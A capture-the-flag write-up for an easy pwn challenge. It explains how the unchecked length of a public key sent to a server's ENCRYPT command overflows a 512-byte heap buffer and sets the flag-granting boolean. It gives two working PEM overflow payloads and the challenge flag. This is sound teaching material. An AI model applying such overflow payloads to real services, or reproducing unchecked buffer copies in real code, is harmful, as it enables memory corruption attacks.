# Writeup [Flagg-server](./README.md)

## Challenge description

**Points: 200**

**Author: petterroea**

**Difficulty: easy-challening, depending on chosen rabbithole**

**Category: pwn**

---

## Writeup

The task is actually a "trivial" buffer overwrite exploit, where most of the difficulty comes from two factors:
 * You need to perform some reverse engineering to understand what you are overwriting
 * You may get sidetracked into generating a valid X.509 blob

First, let's consider the server. It has the following simple commands:

 * PING
 * HELP
 * FLAG
 * ENCRYPT

Of these, only `ENCRYPT` accepts user input. There is also the alternative that it is possible to send a message large enough to overwrite the receive buffer. If you look at the logic handling the `FLAG` command, you will see that a flag has to be set in order to give the desired output. This flag resides in heap malloc'd at the start of the message handler. Right before this flag is a 512 byte buffer, which contains the user-specified public key.

By checking the `ENCRYPT` function we can see that the length of the key is never checked. One could assume the developer thought they were smart by ensuring the key was only 2048 bits long. Overwriting the "should get the CTF flag" flag below the public key buffer is therefore worth checking out.

There are a few ways of doing this.

Given the following public key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuIkSVhBVI1EYMAVJFdeq
n3fiWRBFHWTI9VHx59diFhhZ3pVbd1TnVYvXkXL22norxoll6hjnZVrjdJIFg0j6
e2iB9LtrTGdBAA6bs8+xsmhXPOAdLs5ncO5jD8Y5f5EcdN0ZN9kX1jqOk6NHrxek
KYPDIOWlYVgWpFLLpm4Dm/FEkWfhqVWqg0PW03LVWqFKbRNVgFROEBq4dWPEv5vN
GVEG5asCVYMuCgEugB5INP5EfTvxWL6B0RcgvG8/E7P4xbe6CwEPCXhQdpV3Mhyy
n+VdCJQNtoP1NGU+m+9FX03RW0/jYvd7EvbYMTmKNwAHTCAbkLNS6Dqt2n+4ZKIF
pwIDAQAB
-----END PUBLIC KEY-----
```

There are a few ways to get a valid overflow.

### Naive way

The following key is 516 bytes long and valid, and consists of the original key padded with zeroes and a non-zero value at the end, setting the "should see the flag" to true.

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuIkSVhBVI1EYMAVJFdeqn3fiWRBFHWTI9VHx59diFhhZ3pVbd1TnVYvXkXL22norxoll6hjnZVrjdJIFg0j6e2iB9LtrTGdBAA6bs8+xsmhXPOAdLs5ncO5jD8Y5f5EcdN0ZN9kX1jqOk6NHrxekKYPDIOWlYVgWpFLLpm4Dm/FEkWfhqVWqg0PW03LVWqFKbRNVgFROEBq4dWPEv5vNGVEG5asCVYMuCgEugB5INP5EfTvxWL6B0RcgvG8/E7P4xbe6CwEPCXhQdpV3Mhyyn+VdCJQNtoP1NGU+m+9FX03RW0/jYvd7EvbYMTmKNwAHTCAbkLNS6Dqt2n+4ZKIFpwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKCg==
-----END PUBLIC KEY-----
```

### The rabbithole way

You could also try modifying the underlying ASN.1 data structure. I made the following blob, which libcrypto accepts:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuIkSVhBVI1EYMAVJFdeqn3fiWRBFHWTI9VHx59diFhhZ3pVbd1TnVYvXkXL22norxoll6hjnZVrjdJIFg0j6e2iB9LtrTGdBAA6bs8+xsmhXPOAdLs5ncO5jD8Y5f5EcdN0ZN9kX1jqOk6NHrxekKYPDIOWlYVgWpFLLpm4Dm/FEkWfhqVWqg0PW03LVWqFKbRNVgFROEBq4dWPEv5vNGVEG5asCVYMuCgEugB5INP5EfTvxWL6B0RcgvG8/E7P4xbe6CwEPCXhQdpV3Mhyyn+VdCJQNtoP1NGU+m+9FX03RW0/jYvd7EvbYMTmKNwAHTCAbkLNS6Dqt2n+4ZKIFpwIDAQABMFwWWnBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHA=
-----END PUBLIC KEY-----
```

Which is equivalent to appending the following completely standalone ASN.1 structure to the end:

```
305C 
16 5A 
70707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070
```

Many online tools accept binary blobs containing separate ASN.1 objects, so I would expect some people to try this approach.


### Fetching the flag

When the `ENCRYPT` command is used, all responses from the server will be encrypted. There are many ways of decrypting the flag, but since we are talking about bog standard RSA, you can throw the payload + private key you made into cyberchef and decrypt without any major issues. The flag is:

```
TGHACK{345Y_8U7_w17h_4_7w157}
```